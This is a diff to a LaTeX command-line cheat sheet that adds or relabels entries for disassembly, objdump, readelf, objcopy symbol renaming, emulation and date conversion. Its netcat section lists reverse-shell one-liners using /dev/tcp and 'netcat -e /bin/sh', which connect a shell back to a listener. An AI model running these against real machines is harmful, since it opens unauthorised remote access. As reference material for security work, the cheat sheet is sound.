@@ -107,10 +107,15 @@
 \begin{ldesc}
 	\li[Disassemble program]       \$ objdump -d \I{prog}
 	\li[Dump RO data section]      \$ objdump -j .rodata -s \I{prog}
-	\li[List symbols from program] \$ nm \I{prog}
+%	\li[List symbols]              \$ objdump -t \I{prog}
+	\li[List symbols]              \$ nm \I{prog}
+	\li[Disassemble (objdump)]     \$ objdump -d \I{prog}
 	\li[Disassemble (ndisasm)]     \$ ndisasm \I{prog}
 	\li[Disasm. ncurses]           \$ TERM=vt100 biew \I{prog}
 	\li[Assembly]                  nasm, yasm, gas
+	\li[ELF info]                  \$ readelf -a \I{prog}
+	\li[Rename symbol in lib]      \$ objcopy -{-}redefine-sym \I{o}=\I{n} \I{lib.o}
+	\li[Prefix symbols in lib]     \$ objcopy -{-}prefix-symbols=\I{p} \I{lib.o}
 \end{ldesc}
 
 
@@ -165,8 +170,8 @@
 
 \begin{ldesc}
 	\li[Start system] fake86 -fd0 /usr/share/fake86/rombasic.bin
+	\\ % <-- This somehow makes the output nicer
 \end{ldesc}
-
 
 \subsection{Android}
 
@@ -267,9 +272,9 @@
 
 \begin{ldesc}
 	\li[netcat listen] client\$ netcat -vlp 1337
-	\lI[Linux connect-back]  \$ sh >\& /dev/tcp/client/1337 0>\&1
+	\lI[Linux conn-back]     \$ sh >\& /dev/tcp/client/1337 0>\&1
 	\li[\ \ (colored)]       \$ bash -i >\& /dev/tcp/client/1337 0>\&1
-	\li[Netcat connect-back] \$ netcat -e /bin/sh localhost 1337
+	\li[Netcat conn-back]    \$ netcat -e /bin/sh localhost 1337
 	\li[\ \ (colored)]       \$ nc -e "/bin/bash -i" localhost 1337
 \end{ldesc}
 
@@ -329,8 +334,8 @@
 \section{Dates}
 
 \begin{ldesc}
-	\li[Unix to Human] date -d "@seconds"
-	\li[Human to Unix] date -d "YYYY-mm-dd HH:MM:SS" -f +\%s
+	\li[Unix to Human] date -d "@\I{seconds}"
+	\li[Human to Unix] date -d "\I{YYYY}-\I{mm}-\I{dd} \I{HH}:\I{MM}:\I{SS}" -f +\%s
 \end{ldesc}
 
 \newpage
